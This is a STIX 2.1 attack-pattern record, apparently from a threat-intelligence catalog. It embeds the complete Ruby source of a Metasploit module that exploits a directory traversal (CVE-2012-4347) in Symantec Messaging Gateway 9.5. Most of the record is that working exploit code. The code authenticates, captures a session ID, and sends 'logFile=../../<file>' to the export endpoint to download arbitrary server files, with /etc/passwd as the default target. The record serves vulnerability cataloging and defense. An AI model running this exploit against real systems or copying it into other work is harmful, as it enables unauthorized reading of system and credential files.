{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb7aac8a-baf3-4fda-8107-d183117d3481",
    "created": "2024-08-14T16:30:26.40543Z",
    "modified": "2024-08-14T16:30:26.405435Z",
    "name": "Symantec Messaging Gateway 9.5 Log File Download Vulnerability",
    "description": " This module will download a file of your choice against Symantec Messaging Gateway.  This is possible by exploiting a directory traversal vulnerability when handling the 'logFile' parameter, which will load an arbitrary file as an attachment.  Note that authentication is required in order to successfully download your file.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/symantec_brightmail_logfile.rb",
            "external_id": "symantec_brightmail_logfile.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20120827_00&year=2012"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',\n      'Description'    => %q{\n          This module will download a file of your choice against Symantec Messaging\n        Gateway.  This is possible by exploiting a directory traversal vulnerability\n        when handling the 'logFile' parameter, which will load an arbitrary file as\n        an attachment.  Note that authentication is required in order to successfully\n        download your file.\n      },\n      'References'     =>\n        [\n          ['CVE', '2012-4347'],\n          ['EDB', '23110'],\n          ['OSVDB', '88165'],\n          ['BID', '56789'],\n          ['URL', 'https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20120827_00&year=2012']\n        ],\n      'Author'         =>\n        [\n          'Ben Williams <ben.williams[at]ngssecure.com>',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-11-30'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(41080),\n        OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password to login with'])\n      ])\n  end\n\n  def auth(username, password, sid, last_login)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => '/brightmail/login.do',\n      'headers'   => {\n        'Referer' => \"http://#{peer}/brightmail/viewLogin.do\"\n      },\n      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",\n      'vars_post' => {\n        'lastlogin'  => last_login,\n        'userLocale' => '',\n        'lang'       => 'en_US',\n        'username'   => username,\n        'password'   => password,\n        'loginBtn'   => 'Login'\n      }\n    })\n\n    if res and res.headers['Location']\n      new_uri = res.headers['Location'].scan(/^http:\\/\\/[\\d\\.]+:\\d+(\\/.+)/).flatten[0]\n      res = send_request_cgi({\n        'uri'    => new_uri,\n        'cookie' => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\"\n      })\n\n      return true if res and res.body =~ /Logged in as: #{username}/\n    end\n\n    return false\n  end\n\n\n  def get_login_data\n    sid        = ''  #From cookie\n    last_login = ''  #A hidden field in the login page\n\n    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})\n    if res and !res.get_cookies.empty?\n      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''\n    end\n\n    if res\n      last_login = res.body.scan(/<input type=\"hidden\" name=\"lastlogin\" value=\"(.+)\"\\/>/).flatten[0] || ''\n    end\n\n    return sid, last_login\n  end\n\n\n  def download_file(sid, fname)\n    res = send_request_cgi({\n      'uri'      => '/brightmail/export',\n      'cookie'   => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",\n      'vars_get' => {\n        'type'        => 'logs',\n        'logFile'     => \"../../#{fname}\",\n        'logType'     => '1',\n        'browserType' => '1'\n      }\n    })\n\n    if not res\n      print_error(\"Unable to download the file. The server timed out.\")\n      return\n    elsif res and res.body.empty?\n      print_error(\"File not found or empty.\")\n      return\n    end\n\n    vprint_line\n    vprint_line(res.body)\n\n    f = ::File.basename(fname)\n    p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)\n    print_good(\"File saved as: '#{p}'\")\n  end\n\n\n  def run_host(ip)\n    sid, last_login = get_login_data\n    if sid.empty? or last_login.empty?\n      print_error(\"Missing required login data.  Cannot continue.\")\n      return\n    end\n\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    if not auth(username, password, sid, last_login)\n      print_error(\"Unable to login.  Cannot continue.\")\n      return\n    else\n      print_good(\"Logged in as '#{username}:#{password}'\")\n    end\n\n    fname = datastore['FILENAME']\n    download_file(sid, fname)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-11-30"
}